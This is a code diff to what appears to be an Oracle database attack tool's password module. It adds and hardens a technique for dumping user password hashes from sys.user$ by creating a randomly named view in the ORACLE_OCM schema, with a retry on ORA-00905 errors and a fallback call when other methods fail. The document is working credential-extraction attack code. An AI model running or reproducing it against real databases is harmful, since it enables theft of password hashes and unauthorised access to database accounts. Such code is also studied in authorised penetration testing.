@@ -17,6 +17,7 @@ class Passwords (OracleDatabase):
 		'''
 		logging.debug("Passwords object created")
 		OracleDatabase.__init__(self,args)
+		self.loadInformationRemoteDatabase()
 		self.passwords = []
 
 	def __resetPasswordList__(self):
@@ -106,13 +107,17 @@ class Passwords (OracleDatabase):
 		if self.isDBVersionHigherThan12():
 			logging.info("Trying to get hashes Oracle_OCM view ")
 			randomViewName = generateRandomString(length=10)
-			REQ_CREATE_VIEW = "CREATE VIEW oracle_ocm.{0} as select name, password, spare4 from sys.user$".format(randomViewName)
+			REQ_CREATE_VIEW = "CREATE OR REPLACE VIEW oracle_ocm.{0} as select name, password, spare4 from sys.user$".format(randomViewName)
 			REQ_DELETE_VIEW = "DROP VIEW oracle_ocm.{0}".format(randomViewName)
 			REQ_GET_PWDS    = "SELECT name, password, spare4 FROM oracle_ocm.{0}".format(randomViewName)
 			status = self.__execPLSQL__(REQ_CREATE_VIEW)
 			if isinstance(status, Exception):
-				logging.info("Impossible to create the view in oracle_ocm: {0}".format(self.cleanError(status)))
-				return status
+				#Sometimes error " missing keyword", retry in this case
+				if "ORA-00905" in str(status):
+					status = self.__execPLSQL__(REQ_CREATE_VIEW)
+					if isinstance(status, Exception):
+						logging.info("Impossible to create the view in oracle_ocm: {0}".format(self.cleanError(status)))
+						return status
 			results = self.__execQuery__(query=REQ_GET_PWDS,ld=['name', 'password','spare4'])
 			status = self.__execPLSQL__(REQ_DELETE_VIEW)
 			if isinstance(status, Exception):
@@ -180,6 +185,13 @@ class Passwords (OracleDatabase):
 			self.args['print'].goodNews("OK")
 		else : 
 			self.args['print'].badNews("KO")
+			self.args['print'].subtitle("Hashed Oracle passwords with a view in ORACLE_OCM?")
+			logging.info("Try to get Oracle hashed passwords with an ORACLE_OCM view")
+			status = self.__tryToGetHashedPasswordsWithOracleOCM__()
+			if status == True:
+				self.args['print'].goodNews("OK")
+			else:
+				self.args['print'].badNews("KO")
 		self.args['print'].subtitle("Hashed Oracle passwords from history?")
 		logging.info("Try to get Oracle hashed passwords from the history table")
 		status = self.__tryToGetHashedPasswordsfromHistory__()
